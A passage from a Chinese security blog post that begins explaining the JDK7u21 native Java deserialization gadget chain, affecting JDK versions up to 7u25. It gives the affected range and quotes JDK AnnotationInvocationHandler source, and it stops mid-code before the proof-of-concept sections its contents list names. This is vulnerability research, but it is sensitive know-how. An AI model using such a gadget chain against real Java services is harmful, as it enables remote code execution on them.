<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='影响范围：JDK&amp;lt;=JDK7u25（有部分版本并行开发，所以影响不到） 寻找Gadget 在学习CC1链的时候，我们知道了一个Invoca'>
<title>JDK7u21原生链</title>

<link rel='canonical' href='/p/jdk7u21%E5%8E%9F%E7%94%9F%E9%93%BE/'>

<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='JDK7u21原生链'>
<meta property='og:description' content='影响范围：JDK&amp;lt;=JDK7u25（有部分版本并行开发，所以影响不到） 寻找Gadget 在学习CC1链的时候，我们知道了一个Invoca'>
<meta property='og:url' content='/p/jdk7u21%E5%8E%9F%E7%94%9F%E9%93%BE/'>
<meta property='og:site_name' content='0ZHan&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Java安全' /><meta property='article:published_time' content='2024-03-25T19:43:16&#43;08:00'/><meta property='article:modified_time' content='2024-03-25T19:43:16&#43;08:00'/>
<meta name="twitter:title" content="JDK7u21原生链">
<meta name="twitter:description" content="影响范围：JDK&amp;lt;=JDK7u25（有部分版本并行开发，所以影响不到） 寻找Gadget 在学习CC1链的时候，我们知道了一个Invoca">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-G42YH9J7M8"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-G42YH9J7M8', { 'anonymize_ip': false });
}
</script>

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/1000_huac81c2698ed7f4f7ac0962c570fafca4_51159_300x0_resize_box_3.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">0ZHan&#39;s Blog</a></h1>
            <h2 class="site-description">才须学也</h2>
        </div>
    </header><ol class="social-menu">
            
                <li>
                    <a 
                        href=''
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href=''
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        

        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>主页</span>
            </a>
        </li>
        
        

        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>归档</span>
            </a>
        </li>
        
        

        <li >
            <a href='/tags/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
  <circle cx="9" cy="9" r="2" />
</svg>



                
                <span>标签</span>
            </a>
        </li>
        
        

        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>搜索</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
            
            
                <li id="dark-mode-toggle">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <span>暗色模式</span>
                </li>
            
        </div>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">目录</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li>
      <ol>
        <li><a href="#寻找gadget">寻找Gadget</a>
          <ol>
            <li><a href="#构造第一部分poc">构造第一部分POC</a></li>
            <li><a href="#构造第二部分poc">构造第二部分POC</a></li>
            <li><a href="#构造第三部分poc">构造第三部分POC</a></li>
          </ol>
        </li>
        <li><a href="#linkedhastset版本的poc">LinkedHastSet版本的POC</a></li>
        <li><a href="#高版本修复">高版本修复</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/jdk7u21%E5%8E%9F%E7%94%9F%E9%93%BE/">JDK7u21原生链</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Mar 25, 2024</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    阅读时长: 14 分钟
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <p>影响范围：<code>JDK&lt;=JDK7u25</code>（有部分版本并行开发，所以影响不到）</p>
<h3 id="寻找gadget">寻找Gadget</h3>
<p>在学习CC1链的时候，我们知道了一个<code>InvocationHandler</code>类<code>AnnotationInvocationHandler</code></p>
<p>它用于拦截<code>proxy</code>代理实例，<code>proxy</code>代理实例调用自身的方法时，程序会交由<code>AnnotationInvocationHandler</code>的<code>invoke</code>方法进行处理</p>
<p>看一下<code>JDK7u21</code>版本<code>AnnotationInvocationHandler</code>类定义的部分方法</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#e06c75">AnnotationInvocationHandler</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?</span> <span style="color:#c678dd">extends</span> <span style="color:#e06c75">Annotation</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">type</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Map</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">memberValues</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">this</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">type</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">type</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">this</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">memberValues</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">memberValues</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">public</span> <span style="color:#e06c75">Object</span> <span style="color:#61afef;font-weight:bold">invoke</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Object</span> <span style="color:#e06c75">proxy</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Method</span> <span style="color:#e06c75">method</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">String</span> <span style="color:#e06c75">member</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">method</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;[]</span> <span style="color:#e06c75">paramTypes</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">method</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getParameterTypes</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// Handle Object and Annotation methods
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">member</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">equals</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;equals&#34;</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e06c75">paramTypes</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">1</span> <span style="color:#56b6c2">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">paramTypes</span><span style="color:#56b6c2">[</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">]</span> <span style="color:#56b6c2">==</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">equalsImpl</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">args</span><span style="color:#56b6c2">[</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">]);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">assert</span> <span style="color:#e06c75">paramTypes</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">member</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">equals</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;toString&#34;</span><span style="color:#56b6c2">))</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">toStringImpl</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">member</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">equals</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;hashCode&#34;</span><span style="color:#56b6c2">))</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">hashCodeImpl</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">member</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">equals</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;annotationType&#34;</span><span style="color:#56b6c2">))</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">type</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// Handle annotation member accessors
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">Object</span> <span style="color:#e06c75">result</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">memberValues</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">member</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">result</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">throw</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">IncompleteAnnotationException</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">type</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">member</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">result</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">ExceptionProxy</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">throw</span> <span style="color:#56b6c2">((</span><span style="color:#e06c75">ExceptionProxy</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">result</span><span style="color:#56b6c2">).</span><span style="color:#e06c75">generateException</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">result</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getClass</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">isArray</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e06c75">Array</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getLength</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">result</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">!=</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">result</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">cloneArray</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">result</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e06c75">result</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#e06c75">Boolean</span> <span style="color:#61afef;font-weight:bold">equalsImpl</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Object</span> <span style="color:#e06c75">o</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">o</span> <span style="color:#56b6c2">==</span> <span style="color:#c678dd">this</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e5c07b">true</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(!</span><span style="color:#e06c75">type</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">o</span><span style="color:#56b6c2">))</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e5c07b">false</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Method</span> <span style="color:#e06c75">memberMethod</span> <span style="color:#56b6c2">:</span> <span style="color:#e06c75">getMemberMethods</span><span style="color:#56b6c2">())</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">String</span> <span style="color:#e06c75">member</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">memberMethod</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">Object</span> <span style="color:#e06c75">ourValue</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">memberValues</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">member</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">Object</span> <span style="color:#e06c75">hisValue</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">AnnotationInvocationHandler</span> <span style="color:#e06c75">hisHandler</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">asOneOfUs</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">o</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">hisHandler</span> <span style="color:#56b6c2">!=</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">hisValue</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">hisHandler</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">memberValues</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">member</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">try</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#e06c75">hisValue</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">memberMethod</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">invoke</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">o</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">}</span> <span style="color:#c678dd">catch</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">InvocationTargetException</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">return</span> <span style="color:#e5c07b">false</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">}</span> <span style="color:#c678dd">catch</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">IllegalAccessException</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">throw</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">AssertionError</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">e</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(!</span><span style="color:#e06c75">memberValueEquals</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ourValue</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">hisValue</span><span style="color:#56b6c2">))</span>
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">return</span> <span style="color:#e5c07b">false</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e5c07b">true</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#7f848e">//获取type对象的所有方法
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#c678dd">private</span> <span style="color:#e06c75">Method</span><span style="color:#56b6c2">[]</span> <span style="color:#61afef;font-weight:bold">getMemberMethods</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">memberMethods</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">memberMethods</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">AccessController</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">doPrivileged</span><span style="color:#56b6c2">(</span>
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">new</span> <span style="color:#e06c75">PrivilegedAction</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Method</span><span style="color:#56b6c2">[]&gt;()</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">public</span> <span style="color:#e06c75">Method</span><span style="color:#56b6c2">[]</span> <span style="color:#61afef;font-weight:bold">run</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#c678dd">final</span> <span style="color:#e06c75">Method</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">mm</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">type</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredMethods</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">AccessibleObject</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">mm</span><span style="color:#56b6c2">,</span> <span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#c678dd">return</span> <span style="color:#e06c75">mm</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">});</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e06c75">memberMethods</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#7f848e">//动态代理的hashCode()方法实现
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#c678dd">private</span> <span style="color:#e5c07b">int</span> <span style="color:#61afef;font-weight:bold">hashCodeImpl</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">int</span> <span style="color:#e06c75">result</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Map</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">Entry</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">:</span> <span style="color:#e06c75">memberValues</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">entrySet</span><span style="color:#56b6c2">())</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">result</span> <span style="color:#56b6c2">+=</span> <span style="color:#56b6c2">(</span><span style="color:#d19a66">127</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getKey</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">hashCode</span><span style="color:#56b6c2">())</span> <span style="color:#56b6c2">^</span>
